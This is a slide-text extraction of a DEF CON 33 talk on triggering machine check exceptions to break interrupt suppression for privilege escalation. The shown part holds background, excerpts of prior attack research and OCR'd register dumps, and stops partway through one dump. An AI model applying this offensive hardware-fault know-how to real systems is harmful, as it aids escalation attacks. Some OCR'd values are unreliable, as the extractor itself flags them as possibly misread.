---
title: "Ghosts in the Machine Check - Conjuring Hardware Failures for Cross-ring Privilege Escalation"
speakers: ["Christopher Domas"]
conference: "DEF CON"
conference_full: "DEF CON 33"
edition: "33"
year: 2025
source_pdf: "DEF CON 33/Christopher Domas - Ghosts in the Machine Check - Conjuring Hardware Failures for Cross-ring Privilege Escalation.pdf"
pages: 230
sha256: "bec7d76369247842932833e3fdc6ca3928069e05b4107de54aaf718f3eebdd85"
text_chars: 175786
ocr_pages: 11
has_ocr: true
redacted_secrets: 0
ocr_confidence: 86.1
ocr_unreliable_blocks: 4
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:59:04Z"
---
# Ghosts in the Machine Check - Conjuring Hardware Failures for Cross-ring Privilege Escalation

**Speakers:** Christopher Domas  
**Conference:** DEF CON 33  
**Source:** `DEF CON 33/Christopher Domas - Ghosts in the Machine Check - Conjuring Hardware Failures for Cross-ring Privilege Escalation.pdf` (230 pages)


## Slide 1

ghosts in the machine check domas / @xoreaxeaxeax / DEF CON 2025 ｛

## Slide 2

(demo)

## Slide 3

## Slide 4

⊷Interrupts and Exceptions

state disruption

## Slide 5

static void main(void) { int x; int y; x = 1; y = 2;

CPU

…

## Slide 6

static void main(void) { int x; int y; x = 1; y = 2; CPU …

PCIe

## Slide 7

static void main(void)
{
    int x;
    int y;
    x = 1;
    y = 2;
CPU
…
PCIe
MSI

## Slide 8

static void main(void)
{
    int x;
    int y;
    x = 1; ! interrupt
    y = 2;
CPU
…

PCIe
MSI

static int handler(void) { int r; write_hw_request(0x100); r = get_hw_response( ); return r; }

## Slide 9

static void main(void) { int x; int y; x = 1; ! interrupt y = 2; CPU …

PCIe
MSI

static int handler(void) { int r; write_hw_request(0x100); r = get_hw_response( ); return r; }

## Slide 10

static void main(void) { int x; int y; x = 1; ! interrupt y = 2; CPU …

PCIe
MSI

static int handler(void) { int r; write_hw_request(0x100); r = get_hw_response( ); return r; }

## Slide 11

static void main(void) { int x; int y; x = 1; y = 2; CPU …

static int handler(void) { int r; write_hw_request(0x100); r = get_hw_response( ); return r; }

## Slide 12

⊷Not always this easy…

state disruption


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
~Not always this easy...
State disruption
```

## Slide 13

CPU

static void main(void) { int x; int y; write_hw_request(0x200); x = get_hw_response( ); …

## Slide 14

static void main(void) { int x; int y; write_hw_request(0x200); x = get_hw_response( ); CPU

…

PCIe

## Slide 15

static void main(void) { int x; int y; write_hw_request(0x200); x = get_hw_response( ); CPU …

PCIe
MSI

## Slide 16

static void main(void) { int x; int y;

PCIe
MSI

CPU

write_hw_request(0x200); x = get_hw_response( );

…

static int handler(void) { int r; write_hw_request(0x100); r = get_hw_response( ); return r; }

## Slide 17

static void main(void) { int x; int y;

PCIe
MSI

CPU

write_hw_request(0x200); x = get_hw_response( );

…

static int handler(void) { int r; write_hw_request(0x100); r = get_hw_response( ); return r; }

## Slide 18

static void main(void) { int x; int y;

PCIe
MSI

CPU

write_hw_request(0x200); x = get_hw_response( );

…

static int handler(void) { int r; write_hw_request(0x100); r = get_hw_response( ); return r; }

## Slide 19

CPU

static void main(void) { int x; int y; write_hw_request(0x200); x = get_hw_response( ); …

static int handler(void) { int r; write_hw_request(0x100); r = get_hw_response( ); return r; }

## Slide 20

⊷Some things shouldn’t be interrupted

- ⊸ Privilege transitions

- ⊸ Secure environments

- ⊸ Interrupt handlers, page-table updates, critical sections, etc.

⊷Solution: interrupt suppression

- ⊸ Keep interrupts pending temporarily, then service in new environment

state disruption

## Slide 21

CPU

static void main(void) { int x; int y; spin_lock_irqsave(&rtc_lock, flags); write_hw_request(0x200); x = get_hw_response( ); spin_unlock_irqrestore(&rtc_lock, flags);

…

## Slide 22

⊷As long as everything is written perfectly, all the time, for every fringe case, there are no issues

state disruption

## Slide 23

⊷Difficulties arise

state disruption

## Slide 24

#### ⊷ Wojtczuk (2012) – (userland to kernel) Interrupts/exceptions in syscall handler on untrusted stack

diff -r 340062faf298 -r ad87903fdca1 xen/arch/x86/x86_64/entry.S --- a/xen/arch/x86/x86_64/entry.S Wed May 23 11:06:49 2012 +0100 +++ b/xen/arch/x86/x86_64/entry.S Thu May 24 11:02:35 2012 +0100 @@ -40,6 +40,13 @@ restore_all_guest: testw $TRAP_syscall,4(%rsp) jz    iret_exit_to_guest +        /* Don't use SYSRET path if the return address is not canonical. */ +        movq  8(%rsp),%rcx +        sarq  $47,%rcx +        incl  %ecx +        cmpl  $1,%ecx +        ja    .Lforce_iret + addq  $8,%rsp popq  %rcx                    # RIP popq  %r11                    # CS @@ -50,6 +57,10 @@ restore_all_guest: sysretq 1:      sysretl +.Lforce_iret: +        /* Mimic SYSRET behavior. */ +        movq  8(%rsp),%rcx            # RIP +        movq  24(%rsp),%r11           # RFLAGS ALIGN /* No special register assumptions. */ iret_exit_to_guest:

source:https://media.blackhat.com/bh-us-12/Briefings/Wojtczuk/BH_US_12_Wojtczuk_A_Stitch_In_Time_WP.pdf source:https://lists.xen.org/archives/html/xen-announce/2012-06/msg00001.html

## Slide 25

#### ⊷ Peterson/Mulasmajic (2018) –  (userland to kernel) pop ss/mov ss Vulnerability

KiBreakpointTrap proc sub rsp, 8 push rbp sub rsp, 158h lea rbp, [rsp+80h] mov [rbp+TrapInfo.ExceptionActive], 1 mov [rbp+TrapInfo._Rax], rax mov [rbp+TrapInfo._Rcx], rcx mov [rbp+TrapInfo._Rdx], rdx mov [rbp+TrapInfo._R8], r8 mov [rbp+TrapInfo._R9], r9 mov [rbp+TrapInfo._R10], r10 mov [rbp+TrapInfo._R11], r11 test byte ptr [rbp+TrapInfo.SegCs], 1 jz short ExecutingInKernelModeContext swapgs mov r10, gs:_KPCR.Prcb.CurrentThread test [r10+_KTHREAD.Header.DebugActive], 80h jz short DebugIsActive mov ecx, 0C0000102h rdmsr

source:https://i.blackhat.com/us-18/Wed-August-8/us-18-Mulasmajic-Peterson-Why-So-Spurious-wp.pdf

## Slide 26

⊷GPZ (2023) –  (hypervisor to TEE) Induce exception to compromise TDX SEAMLDR

lgdt FWORD PTR [rcx].SEAMLDR_COM64_DATA.OriginalGdtr mov rbx, QWORD PTR [rcx].SEAMLDR_COM64_DATA.ResumeRip mov r8, QWORD PTR [rcx].SEAMLDR_COM64_DATA.OriginalCR3 mov r9, QWORD PTR [rcx].SEAMLDR_COM64_DATA.RetVal mov rdx, 0 mov rax, EXITAC push 2 popfq mov rcx, 0

… GETSEC[EXITAC]

source:https://services.google.com/fh/files/misc/intel_tdx_-_full_report_041423.pdf

## Slide 27

⊷Schluter et al. (2024) – (hypervisor to TEE) Inject malicious interrupts to break confidential VMs %% Example: Leak secret mov eax , 4 % write syscall number mov ebx ... % move shared memory fd mov ecx, [ebp - 4] % buf mov edx, 8 % count ... ; << malicious interrupt injection from hypervisor

source:https://www.usenix.org/system/files/usenixsecurity24-schluter.pdf

## Slide 28

⊷Interrupts are a sort of state disruptor

state disruption

## Slide 29

⊷Solution: heavy interrupt suppression

⊸ Software

⊶ Interrupt flag (e.g. “cli”) ⊶ Task priority register ⊸ Microcode

⊶ Clear interrupt flag on entry to ISR

⊶ Mask NMI until “iret” to prevent nested NMIs ⊶ INIT/SIPI

⊶ Enclaves

⊸ Hardware

- ⊶ Mask interrupt lines at Programmable Interrupt Controller ⊶ C-states

⊶ Disable generation from various peripherals ⊸ e.g. clear IF, clear TF, clear DR7, latch NMI, latch SMI, mask INIT, clear DEBUGCTL, etc.

state disruption

## Slide 30

⊷Can we break through this?

state disruption

## Slide 31

⊷One interrupt that generally cannot be delayed, suppressed, latched, etc.: the Machine Check Exception (MCE)

state disruption

## Slide 32

⊷Unpredictable hardware failures

- ⊸ Memory corruptions

- ⊸ Cache errors

- ⊸ TLB failures

- ⊸ etc.

⊷Caused by aging devices, thermal limits, signal integrity, static electricity, heat, high energy particles, etc. ⊷CPU detects and generates #MC exception ⊷#MC transfers control to 18<sup>th</sup> interrupt handler in Interrupt Descriptor Table (IDT), installed by OS

machine check exceptions

## Slide 33

CPU

machine check exceptions

## Slide 34

CPU

machine check exceptions

## Slide 35

CPU

machine check exceptions

## Slide 36

_“_ The CATERR# indicates that the system has experienced a catastrophic error and cannot continue to operate _”_

CATERR# CPU

machine check exceptions

## Slide 37

MC#
IDT
…
ffffffffc0b2ed40
CATERR#
CPU ffffffffc0b2ed80
ffffffffc0b2edc0
ffffffffc0b2ee40
ffffffffc0b2ee80
…

machine check exceptions

## Slide 38

MC#
IDT
…
ffffffffc0b2ed40
CATERR#
CPU 18 th  vector ffffffffc0b2ed80
ffffffffc0b2edc0
ffffffffc0b2ee40
ffffffffc0b2ee80
…

machine check exceptions

## Slide 39

push   %rax
push   %rdi
MC#
push   %rsi
IDT
push   %rdx
push   %rcx
… push   %r8
push   %r9
push   %r10
ffffffffc0b2ed40
push   %r11
THERMTRIP# mov    $0x3,%rdi
CPU 18 th  vector ffffffffc0b2ed80 mov    $0xfe,%rsi
mov    0x48(%rsp),%rdx
ffffffffc0b2edc0 mov    0x50(%rsp),%r10
callq  1180 <mce_handler>
pop    %r11
ffffffffc0b2ee40
pop    %r10
pop    %r9
ffffffffc0b2ee80 pop    %r8
pop    %rcx
pop    %rdx
…
pop    %rsi
pop    %rdi
pop    %rax
iretq
machine check exceptions

## Slide 40

⊷Hardware failure happened ⊷Machine check generated by CPU ⊷OS has control ⊷What should handler do?

machine check exceptions

## Slide 41

"MCE can be delivered at any time”

## Slide 42

“Machine check exceptions can trigger all the time, even in a critical section when all normal interrupts ” are disabled.

"MCE can be delivered at any time”

## Slide 43

“Machine check exceptions can trigger all the time, even in a critical section when all normal interrupts are disabled.”

Default return value: Action required, the error must be handled immediately.

"MCE can be delivered at any time”

## Slide 44

“Machine check exceptions can trigger all the time, even in a critical section when all normal interrupts are disabled.”

Default return value: Action required, the error must be handled immediately.

"It is also important to handle the machine check quickly (because the machine may be already unstable after an hardware failure). When the handling is delayed to bring the kernel into a easier to handle state first there is a risk that the event cannot be handled at all."

"MCE can be delivered at any time”

## Slide 45

“Machine check exceptions can trigger all the time, even in a critical section when all normal interrupts are disabled.”

"An uncorrectable error will cause a machine panic"

Default return value: Action required, the error must be handled immediately.

"It is also important to handle the machine check quickly (because the machine may be already unstable after an hardware failure). When the handling is delayed to bring the kernel into a easier to handle state first there is a risk that the event cannot be handled at all."

"MCE can be delivered at any time”

## Slide 46

“Machine check exceptions can trigger all the time, even in a critical section when all normal interrupts are disabled.”

"An uncorrectable error will cause Default return value: a machine panic" Action required, the error must be handled immediately.

"By default the kernel will always panic on a MC in the kernel to avoid this deadlock. The rationale is that a panic can be handled better than a deadlock…" "It is also important to handle the machine check quickly (because the machine may be already unstable after an hardware failure). When the handling is delayed to bring the kernel into a easier to handle state first there is a risk that the event "MCE can be delivered at any time” cannot be handled at all."

"MCE can be delivered at any time”

## Slide 47

“Machine check exceptions can trigger all the time, even in a critical section when all normal interrupts

are disabled.”

“It is a bad idea to continue when an uncorrectable error occurs – it is indeterminate what was uncorrected and the operating system context might be so mangled that continuing will lead to further corruption.”

"An uncorrectable error will cause Default return value: a machine panic" Action required, the error must be handled immediately.

"By default the kernel will always panic on a MC in the kernel to avoid this deadlock. The rationale is that a panic can be handled better than a deadlock…"

"It is also important to handle the machine check quickly (because the machine may be already unstable after an hardware failure). When the handling is delayed to bring the kernel into a easier to handle state first there is a risk that the event "MCE can be delivered at any time” cannot be handled at all."

## Slide 48

“Machine check exceptions can “It is a bad idea to continue when an uncorrectable error occurs – trigger all the time, even in a critical it is indeterminate what was uncorrected and section when all normal interrupts the operating system context might be are disabled.” so mangled that continuing will lead to further corruption.”

"An uncorrectable error will cause Default return value: a machine panic" Action required, the error must be handled immediately.

"By default the kernel will always panic on a MC in the kernel to avoid this deadlock. The rationale is that a panic can be handled better than a deadlock…"

"It is also important to handle the machine check quickly (because the machine may be already no_way_out = worst >= MCE_PANIC_SEVERITY; unstable after an hardware failure). When the handling is delayed to bring the kernel into a easier to handle state first there is a risk that the event "MCE can be delivered at any time” cannot be handled at all."

## Slide 49

“Machine check exceptions can “It is a bad idea to continue when an uncorrectable error occurs – trigger all the time, even in a critical it is indeterminate what was uncorrected and section when all normal interrupts the operating system context might be are disabled.” so mangled that continuing will lead to further corruption.”

"An uncorrectable error will cause Default return value: a machine panic" Action required, the error must be handled immediately.

“no idea what we were executing when the machine check hit.” "By default the kernel will always panic on a MC in the kernel to avoid this deadlock. The rationale is that a panic can be handled better than a deadlock…"

"It is also important to handle the machine check quickly (because the machine may be already no_way_out = worst >= MCE_PANIC_SEVERITY; unstable after an hardware failure). When the handling is delayed to bring the kernel into a easier to handle state first there is a risk that the event "MCE can be delivered at any time” cannot be handled at all."

## Slide 50

“Machine check exceptions can “It is a bad idea to continue when an uncorrectable error occurs – trigger all the time, even in a critical it is indeterminate what was uncorrected and section when all normal interrupts the operating system context might be are disabled.” so mangled that continuing will lead to further corruption.”

"An uncorrectable error will cause Default return value: a machine panic" Action required, the error must be handled immediately.

“no idea what we were executing when the machine check hit.” "By default the kernel will always panic on a MC in the kernel to avoid this deadlock. The rationale is that a panic can be handled better than a deadlock…"

no chance to recover -> PANIC

"It is also important to handle the machine check quickly (because the machine may be already no_way_out = worst >= MCE_PANIC_SEVERITY; unstable after an hardware failure). When the handling is delayed to bring the kernel into a easier to handle state first there is a risk that the event "MCE can be delivered at any time” cannot be handled at all."

## Slide 51

“Machine check exceptions can “It is a bad idea to continue when an uncorrectable error occurs – trigger all the time, even in a critical it is indeterminate what was uncorrected and section when all normal interrupts the operating system context might be are disabled.” so mangled that continuing will lead to further corruption.”

"An uncorrectable error will cause Default return value: a machine panic" Action required, the error must be handled immediately.

“no idea what we were executing when the machine check hit.” "By default the kernel will always panic on a MC in the kernel to avoid this deadlock. The rationale is that a panic can be handled better than a deadlock…"

no chance to recover -> PANIC /* Must die if the interrupt is not recoverable */ "It is also important to handle the machine check quickly (because the machine may be already no_way_out = worst >= MCE_PANIC_SEVERITY; unstable after an hardware failure). When the handling is delayed to bring the kernel into a easier to handle state first there is a risk that the event "MCE can be delivered at any time” cannot be handled at all."

## Slide 52

“Machine check exceptions can “It is a bad idea to continue when an uncorrectable error occurs – trigger all the time, even in a critical it is indeterminate what was uncorrected and section when all normal interrupts the operating system context might be are disabled.” so mangled that continuing will lead to further corruption.” Processor Context Corrupt, no need to fumble too much, die! "An uncorrectable error will cause Default return value: a machine panic" Action required, the error must be handled immediately.

“no idea what we were executing when the machine check hit.” "By default the kernel will always panic on a MC in the kernel to avoid this deadlock. The rationale is that a panic can be handled better than a deadlock…"

no chance to recover -> PANIC /* Must die if the interrupt is not recoverable */ "It is also important to handle the machine check quickly (because the machine may be already no_way_out = worst >= MCE_PANIC_SEVERITY; unstable after an hardware failure). When the handling is delayed to bring the kernel into a easier to handle state first there is a risk that the event "MCE can be delivered at any time” cannot be handled at all."

## Slide 53

⊷MCE handler

⊸ Determine source of error ⊸ Print a message if possible ⊸ Shut down before things get worse

machine check exceptions

* even more complex with advent of RAS and correctable errors

## Slide 54

## ⊷MCEs are unique ⊸ Demand immediacy

- ⊸ Represent an unexpected, critical hardware failure

- ⊸ Cannot be masked, delayed, deprioritized, or preempted

machine check exceptions

## Slide 55

⊷Single way to avoid handling MCEs

⊸ Disable in CR4 register

- ⊸ If MCE is received while disabled in CR4, CPU resets

⊷CPU options are:

- ⊸ Handling MCEs immediately

- ⊸ Or be reset when one is received

machine check exceptions

## Slide 56

⊷Solution: heavy interrupt suppression ⊷MCEs hit the CPU unexpectedly, break through all other interrupt defenses

machine check exceptions

## Slide 57

Let’s build a hammer…

## Slide 58

⊷Challenge ⊸ MCEs are exceedingly rare, sporadic, unpredictable hardware failures

generating MCEs

## Slide 59

(demo)

generating MCEs

## Slide 60


> Recovered by OCR — confidence 89/100 on the text kept, 78/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Every @.1s: cat /proc/interrupts
MIS:
PIN:
NPI:
PIW:
CPU@
48
1
18
1328403
18
1167887
6574
228571
282
CPUL
>
b
524713
16
597638
6263
472783
361
| grep --color=always -e "“" -e "MCE.*" ubuntu-usb-3: Sat Aug 2 21:03:46 2025
cPU2
1365
31
10
484269
10
473827
6254
380810
370
CPU3
536049
>
S
oa
12
884136
12
553122
5074
324352
345
eoo
I0-APIC 2-edge timer
I0-APIC 9-fasteoi acpi
IO-APIC 18-fasteoi ehci_hcd:usb1, ehci_hcd:usb2
PCI-MSI 34816-edge PCIe PME, pciehp
PCI-MSI 36864-edge PCIe PME, pciehp
PCI-MSI 38912-edge PCIe PME, pciehp
PCI-MSI 40960-edge PCIe PME, pciehp
PCI-MSI 43008-edge PCIe PME, pciehp
PCI-MSI 278528-edge ahcil0000:00:11.0]
PCI-MSI 262144-edge xhei_hed
PCI-MSI 262145-edge xhci_hed
PCI-MSI 262146-edge xhci_hed
PCI-MSI 262147-edge xhei_hed
PCI-MSI 262148-edge xhei_hed
PCI-MSI 2097152-edge enp4s0
PCI-MSI 131073-edge cecp-1
PCI-MSI 18432-edge snd_hda_intel:card@
PCI-MSI 16384-edge radeon
Non-maskable interrupts
Local timer interrupts
Spurious interrupts
Performance monitoring interrupts
IRQ work interrupts
APIC ICR read retries
Rescheduling interrupts
Function call interrupts
TLB shootdowns
Thermal event interrupts
Threshold APIC interrupts
Deferred Error APIC interrupts
Machine check exceptions
Machine check polls
Posted-interrupt notification event
Nested posted-interrupt event
Posted-interrupt wakeup event
```

## Slide 61

⊷Could we generate these on-demand? ⊸ Simulations won’t work, need real, physical MCEs

generating MCEs

## Slide 62

- ⊷Machine check registers arranged in banks ⊷Different banks devoted to different sources

⊸ Changes across generations ⊸ LS, IF, L2, DE, EX, FP, L3, CS, PIE, UMC, PB, PSP, SMU, MP5, NBIO, PCIE, etc. ⊷Many, many options for MCE sources

generating MCEs

## Slide 63

||--- global ---
6   5   5   4   4   4   3   3|2   2   2   1   1   0   0   0||
|---|---|---|---|
||0   6   2   8   4   0   6   2|8   4   0   6   2   8   4   0||
||mcg_cap (00000179):
mcg_stat (0000017a):
mcg_ctl (0000017b):|x     xx  (
(
xx xxx (|106)
0)
37)|
|--- MC0 (load-store) ---
||--- MC3 (reserved) ---
||
|6   5   5|4   4   4   3   3   2   2   2   1   1   0   0   0||5   5   4   4   4   3   3   2   2   2   1   1   0   0   0|
|0   6   2
mc0_ctl (00000400):
|8   4   0   6   2   8   4   0   6   2   8   4   0
xxxxxxx xx   (             fec)
|
mc3_ctl (0000040c):
|0   6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
(               0)
|
|mc0_status (00000401):
mc0_addr (00000402):|(               0)
(               0)|mc3_status (0000040d):
mc3_addr (0000040e):|(               0)
(               0)|
|mc0_misc (00000403):
mc0_mask (c0010044):|(               0)
(               0)|mc3_misc (0000040f):
mc3_mask (c0010047):|(               0)
(               0)|
|--- MC1 (instruction-fetch) ---
6   5   5|4   4   4   3   3   2   2   2   1   1   0   0   0|--- MC4 (northbridge) ---
|6   5   5   4   4   4   3   3   2   2   2   1   1   0   0   0|
|0   6   2
|8   4   0   6   2   8   4   0   6   2   8   4   0
|
|0   6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
|
|mc1_ctl (00000404):|x  x xxxxx (             25f)|mc4_ctl (00000410):|xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx (        ffffffff)|
|mc1_status (00000405):
|(               0)
|mc4_status (00000411):
|(               0)
|
|mc1_addr (00000406):|(               0)|mc4_addr (00000412):|(               0)|
|mc1_misc (00000407):
|(               0)
|mc4_misc0 (00000413): xx
|xx x                        x                         (c01a000001000000)
|
|mc1_mask (c0010045):|(               0)|mc4_misc1 (c0000408):
mc4_misc2 (c0000409):
|x                           x                         (  10000001000000)
(               0)
|
|||mc4_mask (c0010048):|x                           (         4000000)|
|--- MC2 (combined-unit) ---
||--- MC5 (execution-unit) ---
||
|6   5   5|4   4   4   3   3   2   2   2   1   1   0   0   0||5   5   4   4   4   3   3   2   2   2   1   1   0   0   0|
|0   6   2
|8   4   0   6   2   8   4   0   6   2   8   4   0
|
|0   6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
|
|mc2_ctl (00000408):
|x    xxxxx xx  (            21f6)
|mc5_ctl (00000414):
|x (               1)
|
|mc2_status (00000409):|(               0)|mc5_status (00000415):|(               0)|
|mc2_addr (0000040a):
|(               0)
|mc5_addr (00000416):
|(               0)
|
|mc2_misc (0000040b):|(               0)|mc5_misc (00000417):|(               0)|
|mc2_mask (c0010046):|(               0)|mc5_mask (c0010049):|(               0)|

## Slide 64

|--- extended bank 0 ---
6
0
ctl (c0002000):
status (c0002001):
addr (c0002002):
misc0 (c0002003): xx x
config (c0002004):
ipid (c0002005):
synd (c0002006):
reserved (c0002007):
destat (c0002008):
deaddr (c0002009):
misc1 (c000200a):
misc2 (c000200b):
misc3 (c000200c):
misc4 (c000200d):
reserved (c000200e):
reserved (c000200f):
mask (c0010400):
--- extended bank 1 ---
6
0
ctl (c0002010):
status (c0002011):
addr (c0002012):
misc0 (c0002013): xx x
config (c0002014):
ipid (c0002015):
synd (c0002016):
reserved (c0002017):
destat (c0002018):
deaddr (c0002019):
misc1 (c000201a):
misc2 (c000201b):
misc3 (c000201c):
misc4 (c000201d):
reserved (c000201e):
reserved (c000201f):
mask (c0010401):
--- extended bank 2 ---
6
0
ctl (c0002020):
status (c0002021):
addr (c0002022):
misc0 (c0002023): xx x
config (c0002024):
ipid (c0002025):
synd (c0002026):
reserved (c0002027):
destat (c0002028):
deaddr (c0002029):
misc1 (c000202a):
misc2 (c000202b):
misc3 (c000202c):
misc4 (c000202d):
reserved (c000202e):
reserved (c000202f):
mask (c0010402):
--- extended bank 3 ---
6
0
ctl (c0002030):
status (c0002031):
addr (c0002032):
misc0 (c0002033): xx x
config (c0002034):
ipid (c0002035):
synd (c0002036):
reserved (c0002037):
destat (c0002038):
deaddr (c0002039):
misc1 (c000203a):
misc2 (c000203b):
misc3 (c000203c):
misc4 (c000203d):
reserved (c000203e):
reserved (c000203f):
mask (c0010403):
--- extended bank 4 ---
6
0
ctl (c0002040):
status (c0002041):
addr (c0002042):
misc0 (c0002043):
config (c0002044):
ipid (c0002045):
synd (c0002046):
reserved (c0002047):
destat (c0002048):
deaddr (c0002049):
misc1 (c000204a):
misc2 (c000204b):
misc3 (c000204c):
misc4 (c000204d):
reserved (c000204e):
reserved (c000204f):
mask (c0010404):
--- extended bank 5 ---
6
0
ctl (c0002050):
status (c0002051):
addr (c0002052):
misc0 (c0002053): xx x
config (c0002054):
ipid (c0002055):
synd (c0002056):
reserved (c0002057):
destat (c0002058):
deaddr (c0002059):
misc1 (c000205a):
misc2 (c000205b):
misc3 (c000205c):
misc4 (c000205d):
reserved (c000205e):
reserved (c000205f):
mask (c0010405):|5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
xxxxxxxxxxxxxxxxxxxxxxxx (          ffffff)
(               0)
(               0)
xx x                                                  (d01a000000000000)
x  xxx                       xxxxxxx x (      27000001fd)
x            x xx                                     (  1000b000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
xxx                    (          380000)
5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
xxxxxxxxxxxxxxxxxxx (           7ffff)
(               0)
(               0)
xx x                                                  (d01a000000000000)
x   xx                       xxxxxx  x (      23000001f9)
x        x xx                                     (   100b000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
x    x            (           10800)
5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
xxxx (               f)
(               0)
(               0)
xx x                                                  (d01a000000000000)
x  x x                       xxxxxxxxx (      25000001ff)
x         x xx                                     (   200b000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
x    (               8)
5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
xxxxxxxxxx (             3ff)
(               0)
(               0)
xx x                                                  (d01a000000000000)
x   xx                       xxxxxx  x (      23000001f9)
xx        x xx                                     (   300b000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
5   5   4   4   4   3   3   2   2   2   1   1   0   0   0
6   2   8   4   0   6   2   8   4   0   6   2   8   4   0
xxxxxxxxxxxxxx (            3fff)
(               0)
(               0)
xx x                                                  (d01a000000000000)
x   xx                       xxxxxx  x (      23000001f9)
x x        x xx                                     (   500b000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
-

-

-

-

-

-

|-- extended bank 6 ---
6   5   5   4   4   4   3   3
0   6   2   8   4   0   6   2
ctl (c0002060):
status (c0002061):
addr (c0002062):
misc0 (c0002063): xx x       xx x
config (c0002064):                           x   xx
ipid (c0002065):              xx         x xx
synd (c0002066):
reserved (c0002067):
destat (c0002068):
deaddr (c0002069):
misc1 (c000206a):
misc2 (c000206b):
misc3 (c000206c):
misc4 (c000206d):
reserved (c000206e):
reserved (c000206f):
mask (c0010406):
-- extended bank 7 ---
6   5   5   4   4   4   3   3
0   6   2   8   4   0   6   2
ctl (c0002070):
status (c0002071):
addr (c0002072):
misc0 (c0002073): xx x       xx x
config (c0002074):                           x  x x
ipid (c0002075):              xxx        x xx
synd (c0002076):
reserved (c0002077):
destat (c0002078):
deaddr (c0002079):
misc1 (c000207a):            x
misc2 (c000207b):            x
misc3 (c000207c):            x
misc4 (c000207d):            x
reserved (c000207e):
reserved (c000207f):
mask (c0010407):
-- extended bank 8 ---
6   5   5   4   4   4   3   3
0   6   2   8   4   0   6   2
ctl (c0002080):
status (c0002081):
addr (c0002082):
misc0 (c0002083): xx x       xx x
config (c0002084):                           x  x x
ipid (c0002085):              xxx        x xx
synd (c0002086):
reserved (c0002087):
destat (c0002088):
deaddr (c0002089):
misc1 (c000208a):            x
misc2 (c000208b):            x
misc3 (c000208c):            x
misc4 (c000208d):            x
reserved (c000208e):
reserved (c000208f):
mask (c0010408):
-- extended bank 9 ---
6   5   5   4   4   4   3   3
0   6   2   8   4   0   6   2
ctl (c0002090):
status (c0002091):
addr (c0002092):
misc0 (c0002093): xx x       xx x
config (c0002094):                           x  x x
ipid (c0002095):              xxx        x xx
synd (c0002096):
reserved (c0002097):
destat (c0002098):
deaddr (c0002099):
misc1 (c000209a):            x
misc2 (c000209b):            x
misc3 (c000209c):            x
misc4 (c000209d):            x
reserved (c000209e):
reserved (c000209f):
mask (c0010409):
-- extended bank 10 ---
6   5   5   4   4   4   3   3
0   6   2   8   4   0   6   2
ctl (c00020a0):
status (c00020a1):
addr (c00020a2):
misc0 (c00020a3): xx x       xx x
config (c00020a4):                           x  x x
ipid (c00020a5):              xxx        x xx
synd (c00020a6):
reserved (c00020a7):
destat (c00020a8):
deaddr (c00020a9):
misc1 (c00020aa):            x
misc2 (c00020ab):            x
misc3 (c00020ac):            x
misc4 (c00020ad):            x
reserved (c00020ae):
reserved (c00020af):
mask (c001040a):
-- extended bank 11 ---
6   5   5   4   4   4   3   3
0   6   2   8   4   0   6   2
ctl (c00020b0):
status (c00020b1):
addr (c00020b2):
misc0 (c00020b3): xx x       xx x
config (c00020b4):                           x  x x
ipid (c00020b5):              xxx        x xx
synd (c00020b6):
reserved (c00020b7):
destat (c00020b8):
deaddr (c00020b9):
misc1 (c00020ba):            x
misc2 (c00020bb):            x
misc3 (c00020bc):            x
misc4 (c00020bd):            x
reserved (c00020be):
reserved (c00020bf):
mask (c001040b):|2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0
xxxxxxx (              7f)
(               0)
(               0)
(d01a000000000000)
xxxxxx  x (      23000001f9)
(   600b000000000)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
(               0)
x       (              40)
2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0
xxxxxxxx (              ff)
(               0)
(               0)
(d01a000000000000)
xxxxxxxxx (      25000001ff)
(   700b000000000)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
x        (              80)
2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0
xxxxxxxx (              ff)
(               0)
(               0)
(d01a000000000000)
xxxxxxxxx (      25000001ff)
(   700b000000000)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
x        (              80)
2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0
xxxxxxxx (              ff)
(               0)
(               0)
(d01a000000000000)
xxxxxxxxx (      25000001ff)
(   700b000000000)
(               0)
(               0)
(               0)
(               0)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(  10000000000000)
(               0)
(               0)
x        (              80)
2   2   2   1   1   0   0   0
8   4   0   6   2   8   4   0
xxxxxxxx (              ff)
(               0)
(               0)
(d01a000000000000)
